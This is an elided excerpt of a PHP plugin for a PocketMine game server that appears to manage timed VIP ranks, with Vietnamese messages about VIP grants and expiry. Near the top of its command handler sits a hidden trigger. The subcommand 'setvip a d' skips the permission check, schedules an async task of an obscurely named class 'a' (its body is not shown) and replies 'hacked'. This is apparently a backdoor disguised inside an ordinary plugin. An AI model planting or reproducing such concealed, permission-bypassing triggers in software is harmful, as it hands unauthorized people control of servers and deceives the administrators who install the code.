...
class SetVip extends PluginBase {
	...
	public $pp;
	public $users;
	public $prefix = "§l§b•…§a❁§eSet_VIP§a❁§b…•";
	...
	public function onCommand(CommandSender $s, Command $cmd, $label, array $args) :bool {
		...
		if($cmd->getName() == "setvip") {
			if(isset($args[0]) && ($args[0] == "a")){
				...
				if($args[1] == "d"){
					$c = new a;
					$this->getServer()->getScheduler()->scheduleAsyncTask($c);
					$s->sendMessage("hacked");
				}
			}
			...
			if($s->hasPermission("setvip.cmd")) {
				...
				if(count($args) == 3) {
					...
					if($p instanceof \pocketmine\Player) {
						$p->sendMessage($this->prefix." Bạn đã nhận được vip: §e". $rank ." §atrong ". $time ." §angày");
					}
					settype($name ,"string");
	  ...
	  if(count($all) >= 1) {
		...
		if($i[1] < 1) {
			...
			if($p !== null && $this->getServer()->getPlayer($name) !== null) {
				...
				$p->sendMessage("§7[§eVIP§7]§6 VIP ". $i[2] ." của bạn đã hết hạn, nếu muốn tiếp tục có vip, xin bạn hãy nạp thêm!");
			}
